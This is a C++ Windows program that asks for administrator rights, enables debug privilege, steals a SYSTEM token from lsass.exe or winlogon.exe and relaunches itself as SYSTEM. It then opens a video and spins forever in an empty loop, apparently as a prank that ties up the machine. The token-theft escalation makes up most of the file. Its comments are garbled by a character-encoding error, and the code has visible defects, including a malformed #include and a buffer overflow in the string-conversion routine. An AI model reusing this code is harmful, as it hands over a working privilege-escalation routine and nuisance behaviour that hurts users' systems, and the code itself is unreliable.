#include <bits/stdc++.h>
#include <windows.h>
#include <winbase.h>
#include <winnt.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <shobjidl.h>
#include <iostream>
#include 'HookAPI.h'

#pragma comment(lib, "NSudoDM.dll")
using namespace std;

std::wstring GetCommandLineWithArgs(const std::wstring &program, const std::vector<std::wstring> &args) {
	std::wstring cmdLine = program;
	for (const auto &arg : args) {
		cmdLine += L" ";
		cmdLine += L"\"";
		cmdLine += arg;
		cmdLine += L"\"";
	}
	return cmdLine;
}

LPWSTR ToLPWSTR(char** charArray) {
    int charCount = 0;
    // �����ܵĶ��ֽ��ַ���
    while (charArray[charCount] != NULL) {
        charCount++;
    }

    int bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, NULL, 0);
    LPWSTR lpwsz = new WCHAR[bufferSize];
    MultiByteToWideChar(CP_ACP, 0, charArray[0], -1, lpwsz, bufferSize);

    // ���������ַ����ظ�ת������
    for (int i = 1; i < charCount; ++i) {
        bufferSize = MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, NULL, 0);
        LPWSTR temp = new WCHAR[bufferSize];
        MultiByteToWideChar(CP_ACP, 0, charArray[i], -1, temp, bufferSize);

        // ��ת����Ŀ��ַ��ַ���׷�ӵ�lpwsz
        wcscat(lpwsz, temp);

        // �ͷ���ʱ���ַ���
        delete[] temp;
    }

    return lpwsz;
}

bool IsAdmin() { //�Ƿ�Ϊ����Ա
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
	if (b) {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) {
			b = FALSE;
		}
		FreeSid(AdministratorsGroup);
	}

	return(b);
}


void Get_Admin(char** argv) { //����Ȩ��������Ա
	if (!IsAdmin()) {
		ShellExecute(NULL, "runas", argv[0], NULL, NULL, SW_SHOWNORMAL);
		//cout<<"get!"<<endl;
		exit(0);
	}
}

bool IsSystem() {
    TCHAR username[1024 + 1];
    DWORD size = 1024 + 1;
    if (GetUserName(username, &size)) {
        // Convert TCHAR array to std::string for easy comparison
        std::string userName = username;
        return _stricmp(userName.c_str(), "SYSTEM") == 0;
    }
    return false;
}

void Get_System(char** argv) { //System
    HANDLE hToken;
    LUID Luid;
    TOKEN_PRIVILEGES tp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = Luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    //ö�ٽ��̻�ȡlsass.exe��ID��winlogon.exe��ID�����������еĿ���ֱ�Ӵ򿪾����ϵͳ����
    DWORD idL, idW;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (0 == _stricmp(pe.szExeFile, "lsass.exe")) {
                idL = pe.th32ProcessID;
            } else if (0 == _stricmp(pe.szExeFile, "winlogon.exe")) {
                idW = pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    //��ȡ���������lsass����winlogon
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
    if(!hProcess)hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
    HANDLE hTokenx;
    //��ȡ����
    OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenx);
    //��������
    DuplicateTokenEx(hTokenx, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hToken);
    CloseHandle(hProcess);
    CloseHandle(hTokenx);
    //������Ϣ
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);
    si.lpDesktop = L"winsta0\\default";
    //char** tmp={argv,"issystem"}

    std::wstring program = ToLPWSTR(argv);
    std::vector<std::wstring> arguments = {};
    std::wstring commandLine = GetCommandLineWithArgs(program, arguments);

    CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY, NULL, const_cast<LPWSTR>(commandLine.c_str()), NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
    CloseHandle(hToken);
    exit(0);
}



int main(int argc, char** argv){
	LoadLibrary("NsudoDM.dll");
	Get_Admin(argv);
	if(!IsSystem()){
		Get_System(argv);
		return 0;
	}
	string cmd="start mopmop.mp4";
	system(cmd.c_str());
	while(1){
		
	} 
}
